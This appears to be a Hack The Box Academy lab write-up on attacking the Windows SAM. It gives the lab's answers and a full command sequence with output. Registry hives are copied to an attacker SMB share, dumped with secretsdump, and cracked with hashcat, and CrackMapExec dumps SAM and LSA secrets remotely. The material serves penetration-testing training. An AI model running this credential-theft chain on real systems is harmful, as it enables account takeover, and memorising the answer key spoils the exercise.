# Attacking SAM

### Where is the SAM database located in the Windows registry?

hklm\sam

### Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

RDP to 10.129.202.137 with user "Bob" and password "HTB\_@cademy\_stdnt!"

```bash
xfreerdp /v:10.129.131.8 /u:bob /p:'HTB_@cademy_stdnt!' /cert-ignore
```

now open cmd as administrator and attack SAM

```bash
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Creating a Share with smbserver.py

{% code overflow="wrap" %}
```bash
impacket-smbserver shared -smb2support /tmp/shared # -user doge -password doge
```
{% endcode %}

Moving Hive Copies to Share

```bash
move sam.save \\10.10.14.179\shared
move security.save \\10.10.14.179\shared
move system.save \\10.10.14.179\shared
```

Running secretsdump.py

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra
[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up... 
```

Cracking Hashes with Hashcat

```bash
sudo vim hash.txt
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
#for ntlm hashes
sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
cat /root/.local/share/hashcat/hashcat.potfile
a3ecf31e65208382e23b3420a34208fc:mommy1 #jason
c02478537b9727d391bc80011c2e2321:matrix #ITbackdoor
58a478135a93ac3bf058a5ea0e8fdb71:Password123 #frontdesk
```

### Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

```bash
#Dumping LSA Secrets Remotely
crackmapexec smb 10.129.131.8 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
SMB         10.129.131.8    445    FRONTDESK01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.131.8    445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.131.8    445    FRONTDESK01      [+] Dumping LSA secrets
SMB         10.129.131.8    445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.131.8    445    FRONTDESK01      NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.131.8    445    FRONTDESK01      frontdesk:Password123
SMB         10.129.131.8    445    FRONTDESK01      [+] Dumped 3 LSA secrets to /home/kali/.cme/logs/FRONTDESK01_10.129.131.8_2024-02-18_113757.secrets and /home/kali/.cme/logs/FRONTDESK01_10.129.131.8_2024-02-18_113757.cached

#Dumping SAM Remotely
crackmapexec smb 10.129.131.8 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
SMB         10.129.131.8    445    FRONTDESK01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.131.8    445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.131.8    445    FRONTDESK01      [+] Dumping SAM hashes
SMB         10.129.131.8    445    FRONTDESK01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.131.8    445    FRONTDESK01      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.131.8    445    FRONTDESK01      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.131.8    445    FRONTDESK01      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.131.8    445    FRONTDESK01      bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
SMB         10.129.131.8    445    FRONTDESK01      jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.131.8    445    FRONTDESK01      ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.131.8    445    FRONTDESK01      frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.131.8    445    FRONTDESK01      [+] Added 8 SAM hashes to the database
```

frontdesk:Password123
